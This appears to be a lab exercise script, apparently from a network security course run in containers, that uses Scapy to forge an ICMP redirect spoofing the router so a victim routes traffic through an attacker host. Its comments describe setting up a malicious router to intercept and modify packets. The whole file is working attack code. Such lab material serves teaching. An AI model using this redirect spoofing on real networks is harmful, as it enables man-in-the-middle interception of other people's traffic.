#!/usr/bin/python3
from scapy.all import *

"""For this task, we will attack the victim container from the attacker container. 
   In the current setup, the victim will use the router container (192.168.60.11) 
   as the router to get to the 192.168.60.0/24 network."""
VICTIM = '10.9.0.5'
ROUTER = '10.9.0.11'
ATTACKER = '10.9.0.105'

# if malicius-router container
"""Using the ICMP redirect attack, we can get the victim to use our malicious router 
   (10.9.0.111) as the router for the destination 192.168.60.5. Therefore, all packets 
   from the victim machine to this destination will be routed through the malicious 
   router. We would like to modify the victim’s packets.
   
   Also change to
   sysctls:
    - net.ipv4.ip_forward=0
    - net.ipv4.conf.all.send_redirects=1
    - net.ipv4.conf.default.send_redirects=1
    - net.ipv4.conf.eth0.send_redirects=1"""
# ATTACKER = '10.9.0.111'
TARGET = '192.168.60.5'

ip = IP(src = ROUTER, dst = VICTIM)
icmp = ICMP(type=5, code=1)
icmp.gw = ATTACKER

# The enclosed IP packet should be the one that
# triggers the redirect message.
ip2 = IP(src = VICTIM, dst = TARGET)
send(ip/icmp/ip2/ICMP());
